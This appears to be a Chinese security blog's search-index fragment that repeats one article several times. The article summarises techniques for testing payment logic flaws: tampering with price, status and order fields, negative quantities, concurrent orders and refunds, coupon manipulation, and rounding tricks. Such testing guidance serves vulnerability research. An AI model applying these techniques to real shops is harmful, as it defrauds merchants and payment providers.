常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#三修改支付类型"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#四更改订单信息"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#五更改数量实现优惠支付"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#六重复支付突破限购"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#七优惠券多次使用"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 在计算价格时，没有对负数进行验证，通过修改某个商品数量为-1实现与1的抵消实现0元购。 同时购买两件商品，修改两件商品其中价格低的商品的金额为负数，实现价格的抵消，低价购买商品。 4、手动增加订单中商品相关的多个参数以达到少付多买的目的。 有的时候在提交订单时抓取数据包可以看到只有一套商品的信息，尝试多添加几套同样的参数订单是否会有变化。 尝试在提交订单的时候多添加几个此类参数 提交订单实际支付金额未变仍是一个商品的价格，但是实际套餐已经变成了四个。 六、重复支付，突破限购在支付系统中，服务端没有做好相关验证，比如订单状态被错误更新或者未更新，未对订单多重提交进行校验。那么就可以并发订单实现优惠订单多次提交。需要注意的是这里有的时候会根据实际支付订单判断，并发了多个订单也可能只有一个优惠订单可以正常支付。 并发订单，多台设备同时提交优惠订单。 常见于限购，一个账号仅许购买一次等 1、限制一个优惠订单时直接并发生成多个优惠订单 2、使用多台设备、多个浏览器、多种支付方式（wx、支付宝等）购买优惠订单 常见于购买会员，会员第一个月往往会有优惠价。生成一个优惠订单后不支付，打开多个设备或者虚拟器设备，同时提交生成优惠订单，再分别支付，有的时候会发现会员截至日期顺延，突破限制以优惠价格购买会员。 3、退款处并发。退款的时候可以发起同一订单多次退款，达到多退款的目的。 七、优惠券多次使用常见于涉及优惠券的订单中。可以在提交订单的时候修改发包中优惠券的值尝试使用大额优惠券，或者按照原数据包中优惠券的构造参数手工添加几张优惠券，达到优惠券叠用的目的。有优惠券面值参数的也可以直接修改数据包中优惠券的面值。 1、在一个订单中叠加使用优惠券 2、修改优惠券标识，尝试使用其他商品中的大额优惠券 3、直接修改优惠券的面值。实际金额计算会扣除优惠的部分，此时修改优惠券面值可以实现低价购买。 八、遍历隐藏或者下架优惠id获取优惠链接漏洞常见位置：会员处、商品处（隐藏商品，已下架商品，开发测试低价商品等） 1、遍历隐藏优惠券 一般会有一些开发时测试的大额优惠券，或者已经过期下架的优惠券，通过遍历可以被使用。 2、遍历商品id从而fuzz到已下架的商品 九、利用小数点精度四舍五入0.019=0.02（比如充值0.019元，第三方支付截取到分也就是0.01元，但是系统四舍五入为0.02）。 ","date":"2024-03-22","objectID":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/:3:0","series":null,"tags":["支付漏洞"],"title":"支付类漏洞挖掘技巧总结","uri":"/%E6%94%AF%E4%BB%98%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/#八遍历隐藏或者下架优惠id获取优惠链接"},{"categories":["学习"],"content":" 支付逻辑漏洞挖掘技巧：在实际漏洞挖掘中，一般最先尝试的就是更改数据包发包内容，可以直接修改支付金额、更改支付状态、更改支付类型、更改提交订单支付的时候其中的订单信息等等，当然也会有一些新奇的功能点可以测试。这些在测试中会遇到的操作可以分为以下几类： 一、更改支付金额在支付流程中，可以修改支付价格的步骤有很多，包括订购、确认信息、付款等。在涉及到价格的步骤中都可以尝试修改，如果网站在某一环节存在逻辑上的漏洞，就可以利用该漏洞对支付价格进行修改。可以直接修改提交订单中的价格字段，一般可尝试0.01，1.00，1等 二、更改支付状态在测试中有的时候订单得支付状态是由用户提交订单时的某个数据包参数决定的，服务端通过支付状态判断订单支付与否，这时我们可以尝试找到这个参数（可以通过正常支付订单的数据包进行对比），对支付状态进行修改。或者还有一种情况是通过检查订单是否支付，这个时候可以通过抓取已支付的订单数据包将其中的订单编号改为未支付的编号，实现绕过。 1、直接修改为已支付状态 2、修改未支付的订单号为已支付订单号 三、修改支付类型通常在提交订单付款时，这里的type一般是对支付方式的判断，可能会存在开发人员测试的时候遗留的无需支付的type值，根据支付方式判断支付与否。可以通过fuzz特定值去实现绕过。比如比较常见的值0（这里需要结合实际进行测试不同的处理方式type值不同），可以实现不需要付款订单就会自动生成。 四、更改订单信息服务端只检查支付是否完成，并没有确认订单金额与银行支付金额是否相同，过分信任客户端提交的数据。此时可以通过替换支付订单号、更换商品id的方式，来完成花少钱买更贵的东西。同时生成两个订单号，一个贵的一个便宜，首先支付便宜的，银行往回返回的时候，替换订单号，然后就可以完成两个订单的同时支付。 常见位置在生成订单、生成支付链接等。 1、修改商品编号 直接在生成的订单中替换商品编号。 2、修改订单号 将金额不同的订单进行替换，可以支付一个金额较少的订单，然后将订单号修改为金额较大的订单，少付实际金额。 3、越权使用他人优惠券、越权使用他人积分等 五、更改数量实现优惠支付支付金额是由购买数量乘以商品单价决定的，这时我们在数据包中修改购买数量，将其修改为负数或者小数，如果站点后台对此没有进行过滤，就有可能存在支付漏洞。 1、将正常的数量值修改至最小值0.01，可以实现低价购买。比如：原价300修改修量为0.01后实付金额变为3。 2、未对负数做检验的还可以将数量改为负数。（这里需要注意，因为后端大部分会校验不允许实付金额小于0或者0.01等，所以有的时候要想实现订单成功生成需要结合实际修改价格） 生成订单时有参数表示商品数量，修改为-1 修改数量为-1后会发现，此时金额为负数。 在提交订单支付的时候，为保证支付成功需要修改金额。 3、对数量没有做负数校验的时候也可以巧用负数抵消实现0元购 